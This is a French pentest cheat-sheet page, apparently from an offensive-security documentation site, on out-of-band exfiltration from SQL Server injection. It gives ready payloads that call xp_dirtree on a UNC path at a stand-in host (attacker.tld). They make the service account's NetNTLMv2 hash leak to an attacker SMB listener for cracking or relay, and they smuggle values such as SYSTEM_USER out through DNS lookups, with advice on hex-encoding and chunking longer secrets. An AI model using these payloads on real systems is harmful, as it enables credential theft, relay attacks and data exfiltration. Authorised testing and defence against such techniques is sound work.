---
order: 6
title: "Exfiltration out-of-band et capture de hash depuis une injection MSSQL"
description: "Utiliser xp_dirtree et les procédures UNC associées dans SQL Server pour exfiltrer des données via DNS et capturer le hash NetNTLM du compte de service."
keywords:
  - out of band
  - xp_dirtree
  - chemin UNC
  - capture NetNTLM
  - exfiltration DNS
---

# Out-of-band

Quand rien n'est reflété et que le timing est lent, on peut forcer SQL Server à accéder au réseau. Plusieurs procédures étendues prennent un argument de chemin et le résolvent, donc pointer l'une d'elles vers un chemin UNC contrôlé par l'attaquant déclenche une résolution DNS et une connexion SMB, ce qui exfiltre des données dans le nom d'hôte et fait fuiter le hash NetNTLM du compte de service.

`xp_dirtree` est le choix courant (souvent exécutable par des logins moins privilégiés, contrairement à `xp_cmdshell`) :

```sql
'; EXEC master..xp_dirtree '\\attacker.tld\x'-- 
```

Le compte de service SQL Server s'authentifie auprès du listener SMB de l'attaquant, et un outil comme Responder capture son hash NetNTLMv2 pour le cracking ou le relais. `xp_fileexist` et `xp_subdirs` se comportent de la même manière.

Pour transporter des données plutôt qu'un simple identifiant, construisez le nom d'hôte UNC à partir de la valeur à voler en utilisant du SQL dynamique, afin que le serveur de noms de l'attaquant l'enregistre via DNS. L'argument interne doit être une chaîne entre apostrophes simples (doublées pour le littéral de l'`EXEC`) ; les guillemets doubles seraient lus comme un identifiant délimité sous le `QUOTED_IDENTIFIER ON` par défaut :

```sql
'; DECLARE @d varchar(1024); SELECT @d=SYSTEM_USER; EXEC('master..xp_dirtree ''\\'+@d+'.attacker.tld\x''')-- 
```

La résolution de `<value>.attacker.tld` atteint le serveur de noms de l'attaquant (par exemple Burp Collaborator), révélant la valeur après décodage. Un label DNS est limité à 63 octets, donc une valeur courte comme `SYSTEM_USER` ou `DB_NAME()` tient dans une seule résolution, mais une valeur longue telle qu'un hash de 142 caractères doit être encodée en hexadécimal et répartie sur plusieurs labels ou sur plusieurs requêtes avec `SUBSTRING`, un fragment par résolution. Cette voie nécessite des requêtes empilées pour la version dynamique, et la variante de capture de hash ne requiert que `EXECUTE` sur `xp_dirtree`, ce qui la rend accessible même sans `sysadmin`.

## Outils

- Responder
- impacket (`ntlmrelayx.py`)

## Références

- Microsoft SQL Server Documentation: extended stored procedures
- OWASP Testing Guide: Testing for SQL Injection
